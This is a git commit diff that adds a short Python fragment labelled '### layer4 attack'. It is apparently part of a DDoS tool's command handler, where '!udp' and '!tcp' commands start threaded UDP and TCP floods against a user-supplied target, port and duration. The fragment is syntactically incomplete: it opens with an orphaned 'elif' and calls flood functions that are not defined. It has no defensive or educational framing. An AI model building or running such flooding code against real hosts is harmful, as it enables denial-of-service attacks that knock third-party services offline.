b70e9fabecad6b3b459010fe8bdbba69ea03adc4
giaquy-Dev <120464606+giaquy-Dev@users.noreply.github.com>
2023-06-01 12:18:21 +0700

    Create dnigdhdiddhdh.py

---
+++ dnigdhdiddhdh.py
@@ -0,0 +1,14 @@
+### layer4 attack 
+ elif '!udp' in cmdl or 'UDP' in cmdl:
+        target, port, thread, t = get_info_l4()
+        threading.Thread(target=runsender, args=(target, port, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
+ elif '!tcp' in cmdl or 'TCP' in cmdl:
+        target, port, thread, t = get_info_l4()
+        threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
+### done
